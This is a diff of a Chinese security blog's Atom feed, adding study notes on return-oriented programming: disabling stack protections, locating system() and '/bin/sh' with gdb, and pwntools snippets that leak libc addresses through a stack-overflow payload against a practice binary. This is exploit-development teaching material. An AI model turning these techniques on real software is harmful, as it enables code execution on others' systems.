@@ -1,12 +1,57 @@
 <?xml version='1.0' encoding='UTF-8'?>
-<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN"><id>/</id><title>yurisec</title><updated>2020-05-15T06:46:23.170340+08:06</updated><author><name>Yuri</name><email>yuripwn@gmail.com</email></author><link href="/" rel="alternate"/><generator uri="https://lkiesow.github.io/python-feedgen" version="0.9.0">python-feedgen</generator><logo>https://cdn.jsdelivr.net/gh/yuriufo/yuriufo.github.io@master/logo.png</logo><subtitle>A simple static blog.</subtitle><entry><id>/archives/note/</id><title>一步一步学ROP笔记</title><updated>2020-05-15T06:46:23.170426+00:00</updated><author><name>yuri</name><email>yuripwn@gmail.com</email><uri>https://www.yurisec.cn</uri></author><content>&lt;h1&gt;一步一步学ROP笔记&lt;/h1&gt;
+<feed xmlns="http://www.w3.org/2005/Atom" xml:lang="zh-CN"><id>/</id><title>yurisec</title><updated>2020-05-15T07:18:29.110088+08:06</updated><author><name>Yuri</name><email>yuripwn@gmail.com</email></author><link href="/" rel="alternate"/><generator uri="https://lkiesow.github.io/python-feedgen" version="0.9.0">python-feedgen</generator><logo>https://cdn.jsdelivr.net/gh/yuriufo/yuriufo.github.io@master/logo.png</logo><subtitle>A simple static blog.</subtitle><entry><id>/archives/note/</id><title>一步一步学ROP笔记</title><updated>2020-05-15T07:18:29.110143+00:00</updated><author><name>yuri</name><email>yuripwn@gmail.com</email><uri>https://www.yurisec.cn</uri></author><content>&lt;h1&gt;一步一步学ROP笔记&lt;/h1&gt;
 &lt;blockquote&gt;&lt;p&gt;原文地址: &lt;a href="drops.wooyun.org/tips/6597"&gt;一步一步学ROP&lt;/a&gt;&lt;/p&gt;
 &lt;/blockquote&gt;
 &lt;h2&gt;x86&lt;/h2&gt;
 &lt;h3&gt;无保护&lt;/h3&gt;
 &lt;ul&gt;
-&lt;li&gt;关掉canary:  &lt;strong&gt;-fno-stack-protector&lt;/strong&gt; &lt;/li&gt;
-&lt;li&gt;关掉NX:  &lt;strong&gt;-z execstack&lt;/strong&gt; &lt;/li&gt;
-&lt;li&gt;关掉PIE:  &lt;strong&gt;sudo -s echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&lt;/strong&gt; &lt;/li&gt;
+&lt;li&gt;关掉canary:  &lt;strong&gt;-fno-stack-protector&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;关掉NX:  &lt;strong&gt;-z execstack&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;关掉PIE:  &lt;strong&gt;sudo -s echo 0 &amp;gt; /proc/sys/kernel/randomize_va_space&lt;/strong&gt;&lt;/li&gt;
 &lt;/ul&gt;
+&lt;h3&gt;绕过NX&lt;/h3&gt;
+&lt;p&gt;gdb下找&lt;code&gt;system()&lt;/code&gt;和&lt;code&gt;"/bin/sh\x00"&lt;/code&gt;的地址:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; print system
+&lt;span class="nv"&gt;$1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0xb7e5f460 &amp;lt;system&amp;gt;
+&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; print __libc_start_main
+&lt;span class="nv"&gt;$2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;&amp;lt;text variable, no debug info&amp;gt;&lt;span class="o"&gt;}&lt;/span&gt; 0xb7e393f0 &amp;lt;__libc_start_main&amp;gt;
+&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; find 0xb7e393f0, +2200000, &lt;span class="s2"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;
+0xb7f81ff8
+&lt;span class="o"&gt;(&lt;/span&gt;gdb&lt;span class="o"&gt;)&lt;/span&gt; x/s 0xb7f81ff8
+0xb7f81ff8:  &lt;span class="s2"&gt;&amp;quot;/bin/sh&amp;quot;&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;绕过NX和PIE&lt;/h3&gt;
+&lt;ul&gt;
+&lt;li&gt;看plt : &lt;strong&gt;objdump -d -j .plt level2&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;看got : &lt;strong&gt;objdump -R level2&lt;/strong&gt;&lt;/li&gt;
+&lt;li&gt;查看目标程序调用的so库 : &lt;strong&gt;ldd level2&lt;/strong&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;用pwntools:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;elf&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;level2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;plt_write&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;elf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+&lt;span class="n"&gt;got_write&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;elf&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;got&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
+
+&lt;span class="n"&gt;libc&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;ELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;libc.so&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;span class="n"&gt;system_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;write_addr&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;write&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;libc&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;symbols&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
+&lt;h3&gt;无libc.so&lt;/h3&gt;
+&lt;p&gt;步骤:&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;泄露&lt;code&gt;__libc_start_main&lt;/code&gt;地址&lt;/li&gt;
+&lt;li&gt;获取&lt;code&gt;libc&lt;/code&gt;版本&lt;/li&gt;
+&lt;li&gt;获取&lt;code&gt;system&lt;/code&gt;地址与&lt;code&gt;/bin/sh&lt;/code&gt;的地址&lt;/li&gt;
+&lt;li&gt;再次执行源程序&lt;/li&gt;
+&lt;li&gt;触发栈溢出执行&lt;code&gt;system(“/bin/sh”)&lt;/code&gt;&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;DynELF的使用:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;leak&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
+    &lt;span class="n"&gt;payload1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;a&amp;#39;&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;140&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;plt_write&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;vulfun_addr&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;p32&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;send&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;payload1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;p&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;recv&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+    &lt;span class="nb"&gt;print&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="si"&gt;%#x&lt;/span&gt;&lt;span class="s2"&gt; =&amp;gt; &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;%&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;address&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="ow"&gt;or&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;encode&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;hex&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;
+
+&lt;span class="n"&gt;d&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;DynELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;leak&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;elf&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;ELF&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;./level2&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt;
+&lt;span class="n"&gt;system_addr&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;d&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;lookup&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;system&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;libc&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
+&lt;/pre&gt;&lt;/div&gt;
 </content><link href="/archives/note/" rel="alternate"/><published>2018-03-28T14:45:00+08:06</published></entry></feed>
